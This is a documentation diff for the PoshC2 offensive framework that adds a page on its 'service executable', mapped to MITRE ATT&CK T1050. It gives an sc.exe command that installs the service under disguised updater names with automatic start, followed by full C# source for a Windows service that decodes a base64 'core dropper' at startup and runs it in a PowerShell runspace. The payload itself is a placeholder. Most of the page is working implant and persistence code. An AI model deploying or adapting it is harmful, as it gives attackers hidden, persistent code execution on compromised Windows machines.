@@ -1,3 +1,72 @@
 ######################
   Service Executable
 ######################
+Mitre ATT&CK - `New Service <https://attack.mitre.org/wiki/Technique/T1050>`_
+
+The following C# code creates the service executable used in PoshC2, where escalation of privileges via service abuse is possble. The code essentially creates a new Powershell Runspace using the System.Management.Automation.dll (v2.0.50727) that is supplied with the project. This executable is not signed and cannot be called directly, must be installed and run via the Windows Service Control Manager. To add a service on the command line use the following command::
+
+	sc.exe create CPUpdater binpath= 'C:\Temp\PoshService.exe" Displayname= CheckpointServiceUpdater start= auto
+
+C# Code::
+
+	using System.Text;
+	using System.ServiceProcess;
+	using System.Collections.ObjectModel;
+	using System.Management.Automation;
+	using System.Management.Automation.Runspaces;
+
+
+	namespace Service
+	{
+	    static class Program
+	    {
+	        static void Main()
+	        {
+	            ServiceBase[] ServicesToRun;
+	            ServicesToRun = new ServiceBase[]
+	            {
+	                new Service1()
+	            };
+	            ServiceBase.Run(ServicesToRun);
+	        }
+	    }
+	    public partial class Service1 : ServiceBase
+	    {
+	        public static string InvokeAutomation(string cmd)
+	        {
+	            Runspace newrunspace = RunspaceFactory.CreateRunspace();
+	            newrunspace.Open();
+	            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
+	            Pipeline pipeline = newrunspace.CreatePipeline();
+
+	            pipeline.Commands.AddScript(cmd);
+	            Collection<PSObject> results = pipeline.Invoke();
+	            newrunspace.Close();
+
+	            StringBuilder stringBuilder = new StringBuilder();
+	            foreach (PSObject obj in results)
+	            {
+	                stringBuilder.Append(obj);
+	            }
+	            return stringBuilder.ToString().Trim();
+	        }
+
+	        protected override void OnStart(string[] args)
+	        {
+	            try
+	            {
+	                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("<base64 encoded core dropper>"));
+	                InvokeAutomation(tt);
+	            }
+	            catch (ArgumentException e)
+	            {
+	                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("<base64 encoded core dropper>"));
+	                InvokeAutomation(tt);
+	            }
+	        }
+
+	        protected override void OnStop()
+	        {
+	        }
+	    }
+	}
